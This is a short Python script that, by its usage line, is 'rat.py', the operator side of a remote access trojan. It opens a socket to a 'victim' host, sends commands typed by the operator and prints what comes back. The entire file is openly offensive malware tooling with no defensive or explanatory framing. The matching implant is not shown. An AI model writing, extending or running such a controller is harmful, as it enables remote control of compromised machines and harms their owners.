import socket, subprocess, sys

def connect_to_victim(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def execute_command(s, command):
    s.send(command.encode())
    response = s.recv(1024).decode()
    return response

def main():
    if len(sys.argv) < 3:
        print("Usage: python rat.py <host> <port>")
        sys.exit(0)

    host = sys.argv[1]
    port = int(sys.argv[2])

    victim_socket = connect_to_victim(host, port)

    while True:
        command = input("Enter command: ")
        response = execute_command(victim_socket, command)
        print(response)

if __name__ == "__main__":
    main()
